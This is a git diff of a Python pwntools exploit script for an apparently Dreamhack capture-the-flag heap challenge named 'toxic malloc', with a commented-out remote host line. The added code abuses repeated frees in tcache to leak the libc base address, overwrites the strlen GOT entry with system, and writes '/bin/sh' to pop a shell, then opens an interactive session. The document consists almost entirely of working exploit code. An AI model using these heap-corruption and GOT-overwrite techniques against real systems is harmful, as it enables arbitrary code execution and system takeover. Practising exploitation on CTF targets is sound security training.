@@ -1,8 +1,17 @@
 from pwn import *
 
-context.log_level = 'debug'
+# context.log_level = 'debug'
+context.terminal = ['tmux', 'new-window']
 
-rem = process("./Pwnable/toxic malloc/problem/deploy/chall")
+env={"LD_PRELOAD":"./Pwnable/toxic malloc/problem/deploy/libc.so.6"}
+rem = process("./Pwnable/toxic malloc/problem/deploy/chall", env=env)
+# port = 18595
+# rem = remote("host3.dreamhack.games", port)
+
+lib = ELF("./Pwnable/toxic malloc/problem/deploy/libc.so.6")
+
+def safe_link(pos, ptr):
+  return (pos >> 12) ^ ptr
 
 def decrypt_safe_linking(ptr):
   _12bits = []
@@ -24,12 +33,12 @@ def decrypt_safe_linking(ptr):
 def create(idx, data):
   rem.sendlineafter(b'choice:', b"1")
   rem.sendlineafter(b': ', str(idx).encode())
-  rem.sendlineafter(b': ', data.encode())
+  rem.sendlineafter(b': ', data)
 
 def update(idx, data):
   rem.sendlineafter(b'choice:', b"2")
   rem.sendlineafter(b': ', str(idx).encode())
-  rem.sendlineafter(b': ', data.encode())
+  rem.sendlineafter(b': ', data)
 
 def read(idx):
   rem.sendlineafter(b'choice:', b"3")
@@ -41,20 +50,23 @@ def delete(idx):
   rem.sendlineafter(b'choice:', b"4")
   rem.sendlineafter(b": ", str(idx).encode())
 
-create(0, "A" * 7)
-
+create(0, b'A' * 7)
+create(4, b'A' * 7)
 delete(0)
+for i in range(7):
+  update(0, chr(ord('B') + i).encode() * 16)
+  delete(0)
 
-update(0, "B" * 8) #overwrite tcache_entry.next & key
+lib_base = u64(read(0).rstrip().ljust(8, b'\x00')) - 0x21ace0
+strlen_got = lib_base + lib.got['strlen']
+sys_addr = lib_base + lib.symbols['system']
+print(hex(strlen_got))
 
-delete(0)#double free
+create(1, p64(strlen_got))
+create(2, b"A" * 7)
+create(3, p64(sys_addr))
+update(0, b"/bin/sh\x00")
+read(0)
 
-ptr = u64(read(0).rstrip().ljust(8, b'\x00'))
-print(hex(ptr))
-print(hex(decrypt_safe_linking(ptr)))
-heap_base = decrypt_safe_linking(ptr) - 0x2a0
-print(hex(heap_base))
-
-# gdb.attach(rem)
-
-# rem.interactive()
+gdb.attach(rem)
+rem.interactive()
